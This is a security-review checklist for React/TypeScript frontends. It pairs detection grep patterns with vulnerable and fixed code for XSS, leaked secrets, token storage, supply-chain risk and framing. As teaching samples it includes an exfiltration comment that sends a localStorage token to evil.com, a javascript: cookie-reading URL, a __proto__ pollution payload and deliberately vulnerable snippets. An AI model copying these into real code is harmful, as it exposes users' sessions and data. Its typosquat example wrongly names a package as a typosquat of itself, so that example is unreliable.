# Frontend Security Checks — Risk Catalog

The source of truth for `forge:react-ts-security-review`. Each entry has: **Risk**, **Detect** (patterns to grep / look for), a **Vulnerable** example, and a **Fixed** example. Default severities are listed but adjust to context — real secrets and unsanitized HTML injection are high; most others are medium or low.

---

## 1. XSS (Cross-Site Scripting)

**Severity:** High when rendering user/external content; medium for static trusted content.

**Risk:** Injecting unsanitized HTML, or a user-controlled `javascript:`/`data:` URL into `href`/`src`, lets an attacker run arbitrary script in the user's session.

**Detect:**
- `dangerouslySetInnerHTML` — flag every occurrence; check the value is sanitized.
- `href={...}` / `src={...}` bound to a variable that originates from props, params, query string, or API data.
- Third-party widget/embed code injected via `innerHTML`, `document.write`, or a raw `<script>` string.
- grep: `dangerouslySetInnerHTML`, `\.innerHTML\s*=`, `document\.write`, `href=\{`, `javascript:`

### Vulnerable
```tsx
// Renders attacker-controlled markup verbatim
function Comment({ body }: { body: string }) {
  return <div dangerouslySetInnerHTML={{ __html: body }} />;
}

// User controls the scheme — `javascript:alert(document.cookie)` runs on click
<a href={profile.website}>Website</a>
```

### Fixed
```tsx
import DOMPurify from 'dompurify';

function Comment({ body }: { body: string }) {
  // Allow-list sanitize before injecting
  const clean = DOMPurify.sanitize(body, { USE_PROFILES: { html: true } });
  return <div dangerouslySetInnerHTML={{ __html: clean }} />;
}

// Validate the scheme before trusting a user-supplied URL
function safeHref(url: string): string | undefined {
  try {
    const parsed = new URL(url, window.location.origin);
    return ['http:', 'https:', 'mailto:'].includes(parsed.protocol) ? parsed.href : undefined;
  } catch {
    return undefined;
  }
}
<a href={safeHref(profile.website)} rel="noopener noreferrer">Website</a>
```

> Prefer rendering as text (`{body}`) whenever HTML isn't actually required — that removes the risk entirely.

---

## 2. Secrets in the Client Bundle

**Severity:** High if the value is a real secret (private key, server-side token); low if it's a public/publishable key meant for the client.

**Risk:** Everything bundled by Vite/CRA/Next public env vars ships to the browser in plaintext. `VITE_*`, `REACT_APP_*`, and `NEXT_PUBLIC_*` are **not secret** — they are embedded in the JS anyone can read.

**Detect:**
- grep: `VITE_[A-Z_]*SECRET`, `VITE_[A-Z_]*KEY`, `VITE_[A-Z_]*TOKEN`, `REACT_APP_.*(SECRET|KEY|TOKEN)`, `NEXT_PUBLIC_.*(SECRET|KEY|TOKEN)`
- Hardcoded literals: `sk_live_`, `AKIA` (AWS), `-----BEGIN`, long base64/hex blobs assigned to a const.
- `console.log` / analytics calls that include a token, auth header, or full user object.

### Vulnerable
```ts
// .env — shipped to the browser, readable in DevTools → Sources
VITE_STRIPE_SECRET_KEY=sk_live_abc123
VITE_DB_PASSWORD=hunter2

// Hardcoded server secret in client code
const ADMIN_API_KEY = 'sk_live_abc123';
fetch('/admin', { headers: { Authorization: `Bearer ${ADMIN_API_KEY}` } });

console.log('auth', { token: accessToken }); // leaks token to console/log sinks
```

### Fixed
```ts
// Only publishable/public values belong in client env vars
VITE_STRIPE_PUBLISHABLE_KEY=pk_live_abc123   // safe: designed to be public
VITE_API_BASE_URL=https://api.example.com

// Secret operations happen server-side; the client calls your backend
await fetch('/api/checkout', { method: 'POST', body: JSON.stringify(cart) });
// The server holds sk_live_... and talks to Stripe.
```

> Rule of thumb: if exposing the value publicly would be a problem, it must not be in any client-side env var or bundle.

---

## 3. Token Storage (localStorage vs httpOnly cookies)

**Severity:** Medium — depends on the app's threat model and XSS surface.

**Risk:** Auth tokens in `localStorage`/`sessionStorage` are readable by any JS on the page, so a single XSS bug exfiltrates the session. `httpOnly` cookies are invisible to JS and immune to that exfiltration (but need CSRF protection).

**Detect:**
- grep: `localStorage.setItem\(['"].*(token|jwt|auth|session)`, `sessionStorage.setItem\(.*token`, `localStorage.getItem\(.*token`
- Reading a token in JS to attach an `Authorization` header (implies it's JS-readable, not httpOnly).

**Tradeoffs:**

| Storage | XSS exposure | CSRF exposure | Sent automatically | Notes |
|---|---|---|---|---|
| `localStorage` | High (any JS reads it) | None | No (manual header) | Survives tab close; convenient but risky |
| `sessionStorage` | High | None | No | Cleared on tab close |
| `httpOnly` cookie | None (JS can't read) | Yes — needs CSRF token / `SameSite` | Yes | Preferred for session tokens |
| In-memory (JS var) | Lower (gone on reload) | None | No | Good for access tokens + silent refresh |

### Vulnerable
```ts
// Any XSS can do: fetch('https://evil.com?t=' + localStorage.token)
localStorage.setItem('accessToken', token);
```

### Fixed
```ts
// Preferred: server sets the session cookie, client never touches it
// Set-Cookie: session=...; HttpOnly; Secure; SameSite=Strict
await fetch('/api/login', { method: 'POST', credentials: 'include', body });

// Acceptable alternative: short-lived access token in memory + httpOnly refresh cookie
let accessToken: string | null = null; // not persisted to storage
```

> If `localStorage` is a hard requirement (e.g. no backend cookie control), flag it as medium and stress that XSS hardening (#1) becomes critical.

---

## 4. Dependency / Supply-Chain Risk

**Severity:** Medium for unvetted packages; high for a package with a `postinstall` script you can't explain.

**Risk:** A malicious or compromised dependency runs with full build/runtime privileges. Newly added, low-maintenance, or typosquatted packages are the common vector.

**Detect:**
- New entries in `package.json` `dependencies`/`devDependencies` — flag ones that are unfamiliar, very new, low-download, or single-maintainer.
- grep `package.json` for lifecycle scripts in dependencies: `postinstall`, `preinstall`, `install` (inspect what they run).
- Typosquats: near-misses of popular names (`react-dom` vs `reactdom`, `lodahs`).
- Recommend running `npm audit` (or `pnpm audit`) and reviewing the lockfile diff.

### Vulnerable
```jsonc
// Adding an obscure helper that pulls a postinstall script
{
  "dependencies": {
    "left-pad-pro": "^0.0.1",          // 12 downloads/week, 1 maintainer, published 3 days ago
    "analytics-tracker": "^1.0.0"       // typosquat of "analytics-tracker"
  },
  "scripts": { "postinstall": "node ./node_modules/left-pad-pro/setup.js" }
}
```

### Fixed
```bash
# Vet before adding: maintenance, downloads, source, open CVEs
npm view <pkg>            # age, maintainers, repo
npm audit                 # known vulnerabilities
# Prefer well-maintained, widely-used packages or write the small helper yourself.
# Pin versions and review the lockfile diff in PRs.
```

> When a PR adds a dependency, call it out: name, why it's needed, and whether a vetted alternative or a few lines of local code would do.

---

## 5. CORS vs CSP (don't confuse them)

**Severity:** Medium — missing CSP is a defense-in-depth gap, not an immediate exploit.

**Risk:** These solve different problems and are frequently mixed up:
- **CORS** controls which *origins may read responses* from your API (a browser cross-origin read policy). It is **not** an XSS or injection defense.
- **CSP** (Content-Security-Policy) restricts what the page may *load and execute* (scripts, styles, frames) — this is what actually mitigates XSS and clickjacking.

**Detect:**
- Claims that "CORS protects us from XSS" or CORS used where CSP is meant.
- Overly-permissive CORS: `Access-Control-Allow-Origin: *` combined with `Allow-Credentials: true`.
- No `Content-Security-Policy` header / meta tag anywhere → suggest adding one.
- grep: `Access-Control-Allow-Origin`, `Content-Security-Policy`, `crossorigin`

### Vulnerable
```ts
// Wildcard origin + credentials is invalid/dangerous; and CORS ≠ XSS protection
res.setHeader('Access-Control-Allow-Origin', '*');
res.setHeader('Access-Control-Allow-Credentials', 'true');
// No CSP set at all.
```

### Fixed
```ts
// CORS: reflect only allow-listed origins when credentials are involved
const allowed = ['https://app.example.com'];
if (allowed.includes(req.headers.origin)) {
  res.setHeader('Access-Control-Allow-Origin', req.headers.origin);
  res.setHeader('Access-Control-Allow-Credentials', 'true');
}

// CSP: restrict what the page can execute/load (real XSS mitigation)
res.setHeader(
  'Content-Security-Policy',
  "default-src 'self'; script-src 'self'; object-src 'none'; frame-ancestors 'none'; base-uri 'self'"
);
```

> CSP is delivered by the server (or a CDN/edge config), not by React. When reviewing frontend-only code, note that CSP belongs in the deploy/server config and flag its absence as a gap.

---

## 6. Client-Side-Only Validation / Authorization

**Severity:** High — this is a real access-control gap, not just a code-quality nit.

**Risk:** Anything enforced only in the browser can be bypassed (DevTools, direct API calls, modified bundle). Client checks are for UX; the backend must re-enforce every rule.

**Detect:**
- Role/permission gates (`if (user.role === 'admin')`) that decide *what data or action is allowed* rather than just *what to render*.
- Hiding a button/route as the only thing stopping a privileged action.
- Validation (price, quantity, ownership) computed on the client and trusted by the request.
- grep: `role ===`, `isAdmin`, `hasPermission`, `canEdit`, `if (user\.`

### Vulnerable
```tsx
// The ONLY thing stopping a non-admin is this render check
{user.role === 'admin' && <DeleteAllButton />}

// Price trusted from the client
await api.post('/orders', { itemId, price: computedPrice }); // attacker sends price: 0
```

### Fixed
```tsx
// Client gate = UX only; the server independently authorizes the action
{user.role === 'admin' && <DeleteAllButton />} // fine for hiding UI...

// ...as long as the backend enforces it too:
// DELETE /admin/items  → server checks the caller's role/permissions
// POST /orders → server looks up the authoritative price by itemId, ignores client price
await api.post('/orders', { itemId, quantity }); // never send price from client
```

> Flag wording: "This check is client-side only — confirm the backend enforces the same rule, otherwise it's bypassable."

---

## 7. Source Maps in Production

**Severity:** Low-to-medium — exposes your source, not a direct exploit, but aids attackers and can leak comments/secrets.

**Risk:** Publicly served `.map` files let anyone reconstruct your original TypeScript, including comments and any inlined constants.

**Detect:**
- Vite: `build.sourcemap: true` (or `'inline'`) in `vite.config.ts`.
- CRA: `GENERATE_SOURCEMAP=true`.
- `.map` files present in the deployed `dist/`.
- grep: `sourcemap`, `GENERATE_SOURCEMAP`

### Vulnerable
```ts
// vite.config.ts — ships readable source maps to production
export default defineConfig({
  build: { sourcemap: true },
});
```

### Fixed
```ts
// Disable public source maps in prod (or upload them privately to your error tracker)
export default defineConfig({
  build: { sourcemap: false },
});
// If you need maps for Sentry et al., generate them and upload out-of-band —
// don't serve them from the public origin.
```

---

## 8. postMessage / window.opener / target="_blank"

**Severity:** Medium.

**Risk:**
- A `message` listener with no `origin` check trusts data from *any* frame/window → injection or auth confusion.
- `target="_blank"` without `rel="noopener noreferrer"` gives the opened page access to `window.opener` (reverse tabnabbing) and leaks the referrer.

**Detect:**
- grep: `addEventListener\(['"]message`, `\.postMessage\(`, `window\.opener`, `target=['"]_blank`
- A `message` handler that uses `event.data` without first checking `event.origin`.
- `target="_blank"` anchors missing `rel`.

### Vulnerable
```tsx
// Trusts any origin
window.addEventListener('message', (e) => {
  setToken(e.data.token); // attacker frame can post this
});

iframeRef.current?.contentWindow?.postMessage(secret, '*'); // broadcast to any origin

<a href={url} target="_blank">Open</a> // exposes window.opener
```

### Fixed
```tsx
const TRUSTED = 'https://widget.example.com';

window.addEventListener('message', (e) => {
  if (e.origin !== TRUSTED) return;        // verify sender
  if (typeof e.data?.token !== 'string') return; // validate shape
  setToken(e.data.token);
});

iframeRef.current?.contentWindow?.postMessage(payload, TRUSTED); // target a specific origin

<a href={url} target="_blank" rel="noopener noreferrer">Open</a>
```

---

## 9. Prototype Pollution & Unsafe JSON Parsing

**Severity:** Medium.

**Risk:** Deep-merging or assigning keys from untrusted JSON can write to `__proto__`/`constructor`/`prototype`, polluting `Object.prototype` and changing app behavior app-wide. `JSON.parse` on untrusted input without a try/catch crashes on malformed data.

**Detect:**
- Recursive merge/`Object.assign`/spread that copies keys straight from external data.
- grep: `__proto__`, `constructor\[`, `JSON.parse\(`, `merge(`, `deepMerge`, `Object.assign(`
- `JSON.parse(...)` without surrounding `try/catch` on data from network/storage/postMessage.

### Vulnerable
```ts
// Untrusted keys merged blindly → __proto__ pollution
function merge(target: any, src: any) {
  for (const k in src) {
    if (typeof src[k] === 'object') merge(target[k] ??= {}, src[k]);
    else target[k] = src[k]; // src = JSON.parse('{"__proto__":{"isAdmin":true}}')
  }
}

const data = JSON.parse(localStorage.getItem('cfg')!); // throws on bad data
```

### Fixed
```ts
const FORBIDDEN = new Set(['__proto__', 'constructor', 'prototype']);

function safeMerge(target: Record<string, unknown>, src: Record<string, unknown>) {
  for (const k of Object.keys(src)) {
    if (FORBIDDEN.has(k)) continue;          // skip dangerous keys
    // ...recurse on plain objects only
    target[k] = src[k];
  }
}

// Validate + guard parsing; ideally pipe through a schema (e.g. Zod)
function parseConfig(raw: string | null) {
  if (!raw) return null;
  try {
    return ConfigSchema.parse(JSON.parse(raw)); // shape-checked, throws caught
  } catch {
    return null;
  }
}
```

> Modern libraries (lodash ≥ 4.17.21) patch known proto-pollution paths — flag old versions and hand-rolled merges.

---

## 10. Clickjacking / Frame Embedding

**Severity:** Medium for sensitive UI (auth, payments, account settings); low otherwise.

**Risk:** If your app can be loaded in an attacker's `<iframe>`, they can overlay it transparently and trick users into clicking sensitive controls (UI redress).

**Detect:**
- No `X-Frame-Options` / no CSP `frame-ancestors` on the deployed app.
- Sensitive flows (login, payment, settings) with no frame-busting awareness.
- grep: `X-Frame-Options`, `frame-ancestors`

### Vulnerable
```ts
// No anti-framing protection — app can be embedded and overlaid anywhere
// (no X-Frame-Options, no CSP frame-ancestors)
```

### Fixed
```ts
// Preferred (modern): CSP frame-ancestors — server/edge header
res.setHeader('Content-Security-Policy', "frame-ancestors 'none'");
// or 'self' / specific allowed parents

// Legacy fallback for older browsers
res.setHeader('X-Frame-Options', 'DENY');
```

> Like CSP/CORS, these are server/host headers, not React code. When reviewing a frontend-only change to sensitive UI, note that anti-framing headers should exist at the deploy layer.
